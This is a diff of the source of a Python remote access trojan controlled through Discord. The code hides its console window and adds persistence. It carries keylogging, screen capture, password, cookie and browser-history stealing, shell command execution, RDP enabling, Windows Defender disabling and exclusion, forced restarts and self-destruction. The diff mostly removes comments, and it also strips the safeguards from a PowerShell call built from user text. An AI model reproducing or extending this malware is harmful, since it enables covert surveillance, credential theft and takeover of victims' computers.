@@ -23,7 +23,6 @@ import io
 import webbrowser
 import glob
 
-# Try to import optional modules
 try:
     import cv2
     CV2_AVAILABLE = True
@@ -62,23 +61,16 @@ try:
 except ImportError:
     WINSOUND_AVAILABLE = False
 
-# Stealth configuration
 if sys.platform == "win32":
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
         pass
 
-# ============================================
-# CONFIGURATION
-# ============================================
 DISCORD_TOKEN = "tokenhere"
 COMMAND_PREFIX = "!"
 CATEGORY_NAME = "RAT Clients"
 
-# ============================================
-# GLOBALS
-# ============================================
 keylog_buffer = []
 keylog_active = False
 streaming = False
@@ -120,7 +112,6 @@ class RATClient(commands.Bot):
         channel_name = self.client_id.lower().replace('_', '-')[:30]
         
         for guild in self.guilds:
-            # Find or create the category
             category = None
             for cat in guild.categories:
                 if cat.name == CATEGORY_NAME:
@@ -134,7 +125,6 @@ class RATClient(commands.Bot):
                 except Exception as e:
                     print(f"⚠️  Could not create category: {e}")
             
-            # Check if channel already exists
             for channel in guild.text_channels:
                 if channel.name == channel_name and channel.category == category:
                     self.my_channel = channel
@@ -143,7 +133,6 @@ class RATClient(commands.Bot):
                     await self.send_connection_alert()
                     return
             
-            # Create new channel
             try:
                 overwrites = {
                     guild.default_role: discord.PermissionOverwrite(
@@ -266,9 +255,6 @@ class RATClient(commands.Bot):
         parts = command.strip().split()
         cmd = parts[0].lower() if parts else ""
         
-        # ============================================
-        # FILE MANAGEMENT
-        # ============================================
         if cmd == "pwd":
             return self.current_dir
         
@@ -364,9 +350,6 @@ class RATClient(commands.Bot):
             except Exception as e:
                 return f"Error: {e}"
         
-        # ============================================
-        # SYSTEM
-        # ============================================
         elif cmd == "info":
             try:
                 info = {
@@ -446,9 +429,6 @@ class RATClient(commands.Bot):
         elif cmd == "persist":
             return self.add_persistence()
         
-        # ============================================
-        # CAPTURE
-        # ============================================
         elif cmd == "screenshot":
             try:
                 img = ImageGrab.grab(all_screens=True)
@@ -496,9 +476,6 @@ class RATClient(commands.Bot):
             except Exception as e:
                 return f"Error: {e}"
         
-        # ============================================
-        # STEALER
-        # ============================================
         elif cmd == "passwords":
             return self.steal_passwords()
         
@@ -508,9 +485,6 @@ class RATClient(commands.Bot):
         elif cmd == "history":
             return self.steal_history()
         
-        # ============================================
-        # NETWORK
-        # ============================================
         elif cmd == "netstat":
             try:
                 result = subprocess.check_output("netstat -an", shell=True, timeout=10)
@@ -546,9 +520,6 @@ class RATClient(commands.Bot):
             except Exception as e:
                 return f"Error: {e}"
         
-        # ============================================
-        # FUN COMMANDS
-        # ============================================
         elif cmd == "beep":
             try:
                 if sys.platform == "win32" and WINSOUND_AVAILABLE:
@@ -578,7 +549,6 @@ class RATClient(commands.Bot):
                     except:
                         pass
                     
-                    # Fallback: use nircmd if available
                     try:
                         subprocess.run(f'nircmd.exe setsysvolume {level * 655}', shell=True, capture_output=True, timeout=2)
                         return f"🔊 Volume set to {level}% (using nircmd)"
@@ -633,11 +603,9 @@ class RATClient(commands.Bot):
                 return "Usage: openurl <url>"
             try:
                 url = parts[1]
-                # Add http:// if no protocol is specified
                 if not url.startswith(('http://', 'https://')):
                     url = 'http://' + url
                 
-                # Use webbrowser module which handles URLs properly
                 webbrowser.open(url)
                 return f"🌐 Opened URL: {url}"
             except Exception as e:
@@ -651,7 +619,6 @@ class RATClient(commands.Bot):
                     return f"File not found: {parts[1]}"
                     
                 if sys.platform == "win32":
-                    # Convert image to BMP for wallpaper
                     if parts[1].lower().endswith(('.jpg', '.jpeg', '.png')):
                         from PIL import Image
                         img = Image.open(parts[1])
@@ -680,8 +647,7 @@ class RATClient(commands.Bot):
                         speaker.Speak(text)
                         return f"🔊 Speaking: {text}"
                     except:
-                        # Fallback to PowerShell
-                        subprocess.run(f'powershell -command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'{text}\')"', shell=True, capture_output=True, timeout=10)
+                        subprocess.run(f'powershell -command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'{text}\')"', shell=True)
                         return f"🔊 Speaking: {text} (using PowerShell)"
                 else:
                     subprocess.run(["espeak", text], shell=True, capture_output=True, timeout=10)
@@ -689,9 +655,6 @@ class RATClient(commands.Bot):
             except Exception as e:
                 return f"Error: {e}"
         
-        # ============================================
-        # SYSTEM CONTROL
-        # ============================================
         elif cmd == "restart":
             os.system("shutdown /r /t 5" if sys.platform == "win32" else "shutdown -r +5")
             return "System will restart in 5 seconds"
@@ -726,9 +689,6 @@ class RATClient(commands.Bot):
         elif cmd == "rdp":
             return self.enable_rdp()
         
-        # ============================================
-        # DEFENDER
-        # ============================================
         elif cmd == "disabledefender":
             return self.disable_defender()
         
@@ -738,24 +698,14 @@ class RATClient(commands.Bot):
         elif cmd == "adddefenderexclusion":
             return self.add_defender_exclusion()
         
-        # ============================================
-        # DANGEROUS
-        # ============================================
         elif cmd == "selfdestruct":
             return self.self_destruct()
         
-        # ============================================
-        # HELP
-        # ============================================
         elif cmd == "help":
             return self.get_help()
         
         else:
             return f"Unknown command: {cmd}"
-
-    # ============================================
-    # HELPER FUNCTIONS
-    # ============================================
 
     def get_help(self):
         help_text = """
